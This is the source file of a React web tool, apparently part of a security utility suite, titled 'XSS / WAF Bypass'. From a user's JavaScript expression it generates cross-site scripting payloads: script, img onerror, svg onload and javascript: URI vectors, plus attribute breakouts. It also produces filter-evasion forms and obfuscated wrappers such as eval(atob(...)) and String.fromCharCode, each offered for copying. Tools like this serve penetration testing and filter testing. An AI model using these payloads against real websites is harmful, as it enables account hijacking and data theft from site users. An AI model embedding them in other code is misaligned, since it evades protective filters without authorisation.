import { useState, useMemo } from 'react'
import { Bug, Copy, Check } from '@phosphor-icons/react'
import { ToolLayout } from '../../components/ToolLayout'
import type { Tool } from '../types'

type Category = 'Tags' | 'WAF' | 'HTML' | 'URL' | 'JS' | 'Obfusc'
const CATEGORIES: Category[] = ['Tags', 'WAF', 'HTML', 'URL', 'JS', 'Obfusc']

// --- encoding helpers ---
const htmlNamedMap: Record<string, string> = {
  '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;', '/': '&#x2F;', '&': '&amp;', '`': '&#96;',
}
const htmlNamed  = (s: string) => s.replace(/[<>"'/&`]/g, c => htmlNamedMap[c] ?? c)
const htmlDec    = (s: string) => [...s].map(c => `&#${c.charCodeAt(0)};`).join('')
const htmlHex    = (s: string) => [...s].map(c => `&#x${c.charCodeAt(0).toString(16)};`).join('')
const jsUnicode  = (s: string) => [...s].map(c => `\\u${c.charCodeAt(0).toString(16).padStart(4, '0')}`).join('')
const jsHex      = (s: string) => [...s].map(c => `\\x${c.charCodeAt(0).toString(16).padStart(2, '0')}`).join('')
const urlAll     = (s: string) => [...s].map(c => '%' + c.charCodeAt(0).toString(16).padStart(2, '0')).join('')
const fromChar   = (s: string) => `eval(String.fromCharCode(${[...s].map(c => c.charCodeAt(0)).join(',')}))`
const evalAtob   = (s: string) => { try { return `eval(atob('${btoa(s)}'))` } catch { return '(non-ASCII not supported)' } }
const strConcat  = (s: string) => (s.match(/.{1,4}/g) ?? []).map(c => `'${c}'`).join('+')

interface Variant {
  id: string
  label: string
  category: Category
  description: string
  build: (input: string) => string
}

const VARIANTS: Variant[] = [
  // XSS tag vectors (input = JS expression)
  { id: 'script',       category: 'Tags',   label: '<script>',              description: 'Classic script tag',                                      build: s => `<script>${s}</script>` },
  { id: 'img-err',      category: 'Tags',   label: '<img onerror>',         description: 'Image tag error event — no quotes',                       build: s => `<img src=x onerror=${s}>` },
  { id: 'img-err-q',    category: 'Tags',   label: '<img onerror="">',      description: 'Image error with double-quoted handler',                   build: s => `<img src=x onerror="${s}">` },
  { id: 'svg',          category: 'Tags',   label: '<svg onload>',          description: 'SVG onload event',                                         build: s => `<svg onload=${s}>` },
  { id: 'details',      category: 'Tags',   label: '<details ontoggle>',    description: 'Fires without user interaction via open attribute',         build: s => `<details open ontoggle=${s}>` },
  { id: 'input-focus',  category: 'Tags',   label: '<input onfocus>',       description: 'Input onfocus with autofocus',                             build: s => `<input onfocus=${s} autofocus>` },
  { id: 'iframe-js',    category: 'Tags',   label: '<iframe src=js:>',      description: 'iframe javascript: URI',                                   build: s => `<iframe src="javascript:${s}">` },
  { id: 'a-href',       category: 'Tags',   label: '<a href=js:>',          description: 'Anchor javascript: href',                                  build: s => `<a href="javascript:${s}">click</a>` },
  { id: 'break-dq',     category: 'Tags',   label: '"><img onerror>',       description: 'Break out of double-quoted attribute context',             build: s => `"><img src=x onerror=${s}>` },
  { id: 'break-sq',     category: 'Tags',   label: "'><img onerror>",       description: 'Break out of single-quoted attribute context',             build: s => `'><img src=x onerror=${s}>` },
  { id: 'break-script', category: 'Tags',   label: '</script><script>',     description: 'Break out of existing script block then reopen',           build: s => `</script><script>${s}</script>` },
  { id: 'svg-img',      category: 'Tags',   label: '<svg><img onerror>',    description: 'SVG with nested img error handler',                        build: s => `<svg><img src=x onerror=${s}></svg>` },
  // WAF evasion
  { id: 'uppercase',    category: 'WAF',    label: '<SCRIPT>',              description: 'Uppercase — bypasses case-sensitive keyword filters',       build: s => `<SCRIPT>${s}</SCRIPT>` },
  { id: 'mixedcase',    category: 'WAF',    label: '<ScRiPt>',              description: 'Mixed case — confuses naive pattern matching',              build: s => `<ScRiPt>${s}</ScRiPt>` },
  { id: 'comment',      category: 'WAF',    label: '<scri<!---->pt>',       description: 'HTML comment inside tag name — breaks keyword scanning',   build: s => `<scri<!---->${s}</scri<!------>pt>` },
  { id: 'slash-sep',    category: 'WAF',    label: '<img/src=x/onerror>',   description: 'Slash as separator — valid in HTML5, breaks some parsers', build: s => `<img/src=x/onerror=${s}>` },
  { id: 'tab-sep',      category: 'WAF',    label: '<img\\t onerror>',      description: 'Tab as attribute separator',                               build: s => `<img\tsrc=x\tonerror=${s}>` },
  { id: 'newline-sep',  category: 'WAF',    label: '<img\\n onerror>',      description: 'Newline as attribute separator',                           build: s => `<img\nsrc=x\nonerror=${s}>` },
  { id: 'backtick',     category: 'WAF',    label: 'Backtick attr delim',   description: 'Backtick as attribute delimiter — works in IE',            build: s => `<img src=x onerror=\`${s}\`>` },
  { id: 'proto-bypass', category: 'WAF',    label: 'jaVasCriPt: URI',       description: 'Mixed-case javascript: protocol — bypasses naive checks',  build: s => `<a href="jaVasCriPt:${s}">click</a>` },
  { id: 'vbs',          category: 'WAF',    label: 'vbscript: (IE)',         description: 'VBScript URI — Internet Explorer only',                    build: () => `<a href="vbscript:msgbox(1)">click</a>` },
  // HTML encoding
  { id: 'html-named',   category: 'HTML',   label: 'Named entities',        description: 'Replace < > " \' / & with named HTML entities',            build: htmlNamed },
  { id: 'html-dec',     category: 'HTML',   label: 'Decimal entities',      description: 'Every char as &#NNN;',                                     build: htmlDec },
  { id: 'html-hex',     category: 'HTML',   label: 'Hex entities',          description: 'Every char as &#xNN;',                                     build: htmlHex },
  // URL encoding
  { id: 'url-comp',     category: 'URL',    label: 'encodeURIComponent',    description: 'Standard URL encoding',                                    build: s => encodeURIComponent(s) },
  { id: 'url-dbl',      category: 'URL',    label: 'Double URL encode',     description: '% → %25 — bypasses single-decode WAF filters',             build: s => encodeURIComponent(encodeURIComponent(s)) },
  { id: 'url-all',      category: 'URL',    label: 'Hex encode all (%XX)',  description: 'Every char as %XX including alphanumerics',                build: urlAll },
  // JS escapes
  { id: 'js-unicode',   category: 'JS',     label: '\\u escapes',           description: 'JS \\uXXXX Unicode escapes for every char',                build: jsUnicode },
  { id: 'js-hex',       category: 'JS',     label: '\\x escapes',           description: 'JS \\xXX hex escapes for every char',                      build: jsHex },
  // Obfuscation
  { id: 'fromcharcode', category: 'Obfusc', label: 'fromCharCode()',        description: 'eval(String.fromCharCode(...)) — avoids quotes and keywords', build: fromChar },
  { id: 'eval-atob',    category: 'Obfusc', label: 'eval(atob())',          description: 'Base64-encode the payload, wrap with eval(atob(...))',      build: evalAtob },
  { id: 'str-concat',   category: 'Obfusc', label: 'String concat',         description: 'Split payload into concatenated string chunks',             build: strConcat },
]

const CAT_ON: Record<Category, string> = {
  Tags:   'border-vs-accent  text-vs-accent  bg-vs-accent/10',
  WAF:    'border-orange-400 text-orange-400 bg-orange-400/10',
  HTML:   'border-blue-500   text-blue-400   bg-blue-500/10',
  URL:    'border-purple-400 text-purple-400 bg-purple-400/10',
  JS:     'border-yellow-500 text-yellow-500 bg-yellow-500/10',
  Obfusc: 'border-red-500    text-red-400    bg-red-500/10',
}
const CAT_BADGE: Record<Category, string> = {
  Tags:   'bg-vs-accent/20  text-vs-accent',
  WAF:    'bg-orange-400/20 text-orange-400',
  HTML:   'bg-blue-500/20   text-blue-400',
  URL:    'bg-purple-400/20 text-purple-400',
  JS:     'bg-yellow-500/20 text-yellow-500',
  Obfusc: 'bg-red-500/20    text-red-400',
}

function CopyBtn({ value }: { value: string }) {
  const [copied, setCopied] = useState(false)
  return (
    <button
      onClick={() => { navigator.clipboard.writeText(value); setCopied(true); setTimeout(() => setCopied(false), 1500) }}
      title="Copy"
      className="shrink-0 p-1 rounded text-vs-muted hover:text-vs-text hover:bg-vs-active transition-colors"
    >
      {copied ? <Check size={13} weight="bold" className="text-green-400" /> : <Copy size={13} />}
    </button>
  )
}

function XSSEncoder() {
  const [input, setInput] = useState('alert(document.domain)')
  const [cats, setCats]   = useState<Set<Category>>(new Set(CATEGORIES))

  const toggleCat = (c: Category) =>
    setCats(prev => { const n = new Set(prev); n.has(c) ? n.delete(c) : n.add(c); return n })

  const rows = useMemo(
    () => VARIANTS.filter(v => cats.has(v.category)).map(v => ({ ...v, result: v.build(input) })),
    [cats, input]
  )

  return (
    <ToolLayout title="XSS / WAF Bypass" description="Build XSS payloads and encode strings to bypass WAF filters and HTML sanitizers">
      <div className="flex flex-col gap-5 max-w-2xl">

        <p className="text-vs-muted text-xs border-l-2 border-vs-border pl-3 leading-relaxed">
          For <span className="text-vs-text font-mono">Tags</span> and <span className="text-vs-text font-mono">WAF</span> variants, enter a JS expression like{' '}
          <span className="font-mono text-vs-text">alert(1)</span>. For encoding categories (HTML / URL / JS / Obfusc), the full input string is transformed.
        </p>

        <div className="flex flex-col gap-1.5">
          <label className="text-vs-muted text-xs uppercase tracking-widest">Payload / expression</label>
          <input
            type="text"
            value={input}
            onChange={e => setInput(e.target.value)}
            placeholder="alert(document.domain)"
            spellCheck={false}
            className="w-full bg-vs-sidebar border border-vs-border text-vs-text text-sm font-mono px-3 py-2 rounded outline-none focus:border-vs-accent transition-colors"
          />
        </div>

        <div className="flex flex-col gap-1.5">
          <span className="text-vs-muted text-xs uppercase tracking-widest">Bypass type</span>
          <div className="flex gap-2 flex-wrap">
            {CATEGORIES.map(cat => (
              <button
                key={cat}
                onClick={() => toggleCat(cat)}
                className={`px-3 py-1 text-xs rounded border transition-colors ${
                  cats.has(cat) ? CAT_ON[cat] : 'border-vs-border text-vs-muted hover:bg-vs-hover'
                }`}
              >
                {cat}
              </button>
            ))}
          </div>
        </div>

        {rows.length > 0 ? (
          <div className="flex flex-col gap-1.5">
            <div className="flex items-center justify-between">
              <span className="text-vs-muted text-xs uppercase tracking-widest">Variants</span>
              <span className="text-vs-muted text-xs">{rows.length} variant{rows.length !== 1 ? 's' : ''}</span>
            </div>
            <div className="flex flex-col gap-1">
              {rows.map(v => (
                <div key={v.id} className="flex items-center gap-2 bg-vs-sidebar border border-vs-border rounded px-3 py-2 hover:border-vs-accent/40 transition-colors">
                  <span className={`shrink-0 text-[10px] font-mono px-1.5 py-0.5 rounded ${CAT_BADGE[v.category]}`}>
                    {v.category}
                  </span>
                  <div className="flex flex-col flex-1 min-w-0">
                    <span className="text-vs-muted text-[10px] leading-tight">{v.label}</span>
                    <span title={v.description} className="text-vs-text text-xs font-mono break-all leading-snug">{v.result}</span>
                  </div>
                  <CopyBtn value={v.result} />
                </div>
              ))}
            </div>
          </div>
        ) : (
          <p className="text-vs-muted text-xs text-center py-6 border border-dashed border-vs-border rounded">
            Toggle at least one bypass type above.
          </p>
        )}

      </div>
    </ToolLayout>
  )
}

export default {
  meta: {
    slug: 'xss-encoder',
    name: 'XSS / WAF Bypass',
    description: 'Build XSS payloads and encode strings to bypass WAF filters',
    icon: Bug,
  },
  Component: XSSEncoder,
} satisfies Tool
